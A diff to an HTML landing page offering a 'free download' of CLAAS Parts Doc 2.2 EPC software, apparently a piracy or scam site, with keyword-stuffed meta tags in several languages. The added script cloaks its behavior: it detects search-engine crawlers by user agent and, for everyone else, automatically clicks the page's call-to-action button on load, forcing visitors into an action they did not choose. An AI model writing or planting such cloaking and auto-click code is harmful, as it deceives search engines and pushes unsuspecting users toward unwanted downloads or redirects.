@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CLAAS Parts Doc 2.2 EPC 08.2024 (Agricultural)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download CLAAS Parts Doc 2.2 EPC 08.2024, an electronic parts catalog for CLAAS agricultural machinery. Available in multiple languages.">
     <meta name="keywords" content="CLAAS Parts Doc 2.2 EPC, CLAAS Parts Doc 2.2 EPC 2024, CLAAS Parts Doc 2.2 EPC free download, CLAAS EPC 08.2024, CLAAS Parts Doc 2.2 EPC download, CLAAS Parts Doc 2.2 EPC 08.2024 download, CLAAS agricultural EPC, CLAAS agricultural parts catalog, CLAAS parts catalogue free download, CLAAS spare parts catalog 2024, CLAAS parts software 2024, CLAAS parts software free download, CLAAS spare parts database 2024, CLAAS parts catalog high speed download, CLAAS electronic parts catalog download, CLAAS EPC download free, CLAAS EPC software, CLAAS EPC software free download, CLAAS components identification, CLAAS machinery repair, CLAAS spare parts 2024, каталог запчастей CLAAS скачать бесплатно, каталог запчастей CLAAS Parts Doc 2.2 EPC 08.2024, CLAAS каталог запчастей, CLAAS EPC запчасти скачать, CLAAS электрический каталог запчастей, CLAAS zapchastyny katalog, CLAAS zapchastyny katalog bezkoshtovno, CLAAS EPC zapchastyny zavantazhennia">
     <style>
